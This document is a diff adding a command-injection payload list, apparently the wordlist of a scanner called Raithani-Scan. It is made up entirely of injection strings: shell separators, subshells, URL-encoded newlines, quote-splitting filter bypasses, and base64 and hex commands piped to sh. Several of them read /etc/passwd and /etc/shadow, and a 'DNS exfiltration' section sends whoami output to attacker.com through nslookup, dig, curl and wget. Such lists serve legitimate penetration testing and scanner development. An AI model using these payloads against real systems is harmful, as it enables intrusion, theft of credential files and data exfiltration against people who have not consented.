@@ -1,0 +1,158 @@
+# Command Injection Payloads - Raithani-Scan
+# ============================================
+# Semi-colon based
+; id
+; whoami
+; ls -la
+; pwd
+; uname -a
+; cat /etc/passwd
+; cat /etc/shadow
+; echo VULNERABLE
+; id ;
+; id;id
+; ls;echo SEPARATOR;whoami
+
+# Pipe based
+| id
+| whoami
+| ls -la
+| pwd
+| uname -a
+| cat /etc/passwd
+| cat /etc/shadow
+| echo VULNERABLE
+| id |
+| id|id
+
+# AND based
+& id
+&& id
+& whoami
+&& whoami
+& ls -la
+&& ls -la
+& id &
+&& id &&
+& id && id
+
+# OR based
+|| id
+|| whoami
+|| ls -la
+|| pwd
+||
+
+# Backtick based
+`id`
+`whoami`
+`ls -la`
+`cat /etc/passwd`
+`id;id`
+`uname -a`
+`echo VULNERABLE`
+`cat /etc/passwd`
+
+# Subshell based
+$(id)
+$(whoami)
+$(ls -la)
+$(cat /etc/passwd)
+$(uname -a)
+$(echo VULNERABLE)
+$(id;id)
+$(id)$(whoami)
+$(id)||$(whoami)
+
+# Newline based
+%0aid
+%0Acat /etc/passwd
+%0Aid%0A
+%0Auname -a%0A
+%0awhoami
+%0Als -la
+
+# CRLF based
+%0d%0aid
+%0d%0acat /etc/passwd
+%0d%0aid%0d%0a
+%0d%0auname -a%0d%0a
+
+# Tab based
+%09id
+%09cat /etc/passwd
+%09uname -a
+%09ls -la
+
+# Chained commands (combining techniques)
+; id | whoami
+; id && uname -a
+; `id` ; echo done
+`id;uname -a`
+$(id;uname -a)
+; id; ls -la; echo done;
+; id || whoami
+| id | whoami
+
+# String breaking (bypass filter)
+w'h'o'a'm'i
+w"h"o"a"m"i
+who$*ami
+who""ami
+who''ami
+who$@ami
+who\ami
+w\ho\am\i
+who'$@'ami
+who'a'm'i
+$(echo whoami)
+`echo whoami`
+who`echo a`mi
+who""a""mi
+who'$'ami
+whoa'm'i
+
+# Base64 encoded commands
+| echo 'aWQ=' | base64 -d | sh
+; echo 'd2hvYW1p' | base64 -d | sh
+| echo 'bHMgLWxh' | base64 -d | sh
+; echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh
+$(echo 'd2hvYW1p' | base64 -d | sh)
+`echo 'd2hvYW1p' | base64 -d | sh`
+
+# Hex encoded commands
+| echo 6964 | xxd -r -p | sh
+; echo 77686f616d69 | xxd -r -p | sh
+$(echo 6964 | xxd -r -p | sh)
+`echo 6964 | xxd -r -p | sh`
+
+# DNS exfiltration (blind)
+; nslookup $(whoami).attacker.com
+| nslookup $(whoami).attacker.com
+; dig $(whoami).attacker.com
+| dig $(whoami).attacker.com
+; host $(whoami).attacker.com
+; curl http://attacker.com/$(whoami)
+| wget http://attacker.com/$(whoami)
+$(curl http://attacker.com/$(whoami))
+
+# Sleep based timing (for blind detection)
+; sleep 5
+| sleep 5
+& sleep 5
+&& sleep 5
+`sleep 5`
+$(sleep 5)
+%0Asleep 5
+
+# Redirection based
+< /etc/passwd
+> /tmp/test
+<> /etc/passwd
+< /etc/passwd > /tmp/out
+
+# Command substitution (nested)
+$(cat /etc/passwd | head -1)
+$(ls -la /etc/passwd)
+$(cat /etc/passwd 2>&1)
+$(id; whoami; ls)
